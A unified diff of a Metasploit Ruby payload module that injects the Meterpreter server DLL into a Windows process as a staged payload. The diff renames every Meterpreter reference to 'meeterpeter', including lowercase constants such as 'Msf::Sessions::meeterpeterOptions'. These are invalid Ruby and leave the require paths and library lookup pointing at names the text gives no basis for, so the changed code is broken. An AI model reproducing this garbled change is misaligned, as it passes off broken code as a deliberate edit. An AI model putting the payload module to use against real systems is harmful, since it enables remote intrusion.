@@ -6,26 +6,26 @@
 
 require 'msf/core'
 require 'msf/core/payload/windows/dllinject'
-require 'msf/base/sessions/meterpreter_x86_win'
-require 'msf/base/sessions/meterpreter_options'
+require 'msf/base/sessions/meeterpeter_x86_win'
+require 'msf/base/sessions/meeterpeter_options'
 
 ###
 #
-# Injects the meterpreter server instance DLL via the DLL injection payload.
+# Injects the meeterpeter server instance DLL via the DLL injection payload.
 #
 ###
 module Metasploit3
 
   include Msf::Payload::Windows::DllInject
-  include Msf::Sessions::MeterpreterOptions
+  include Msf::Sessions::meeterpeterOptions
 
   def initialize(info = {})
     super(update_info(info,
-      'Name'          => 'Windows Meterpreter (skape/jt Injection)',
-      'Description'   => 'Inject the meterpreter server DLL (staged)',
+      'Name'          => 'Windows meeterpeter (skape/jt Injection)',
+      'Description'   => 'Inject the meeterpeter server DLL (staged)',
       'Author'        => 'skape',
       'License'       => MSF_LICENSE,
-      'Session'       => Msf::Sessions::Meterpreter_x86_Win))
+      'Session'       => Msf::Sessions::meeterpeter_x86_Win))
 
     # Don't let people set the library name option
     options.remove_option('LibraryName')
@@ -41,7 +41,7 @@ module Metasploit3
   end
 
   def library_path
-    MetasploitPayloads.meterpreter_path('metsrv','x86.dll')
+    MetasploitPayloads.meeterpeter_path('metsrv','x86.dll')
   end
 
 end
